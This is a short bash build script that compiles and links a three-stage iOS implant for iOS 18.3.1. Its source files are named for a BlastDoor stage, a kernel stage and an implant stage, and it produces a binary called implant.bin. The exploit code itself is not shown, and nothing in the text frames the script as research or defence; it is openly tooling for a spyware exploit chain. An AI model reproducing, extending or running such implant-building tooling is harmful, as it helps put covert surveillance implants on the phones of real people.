#!/bin/bash
echo "[*] Building implant for iOS 18.3.1..."
SDK="/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk"
clang -arch arm64 -isysroot "$SDK" -mios-version-min=18.0 -c stage1_blastdoor.c -o stage1.o && echo "[+] stage1.o"
clang -arch arm64 -isysroot "$SDK" -mios-version-min=18.0 -c stage2_kernel.c -o stage2.o && echo "[+] stage2.o"
clang -arch arm64 -isysroot "$SDK" -mios-version-min=18.0 -c stage3_implant.c -o stage3.o && echo "[+] stage3.o"
ld -arch arm64 -syslibroot "$SDK" -ios_version_min 18.0 -lSystem -framework IOSurface -framework CoreFoundation -framework Foundation -o implant.bin stage1.o stage2.o stage3.o && echo "[+] implant.bin"
rm -f stage1.o stage2.o stage3.o
ls -la implant.bin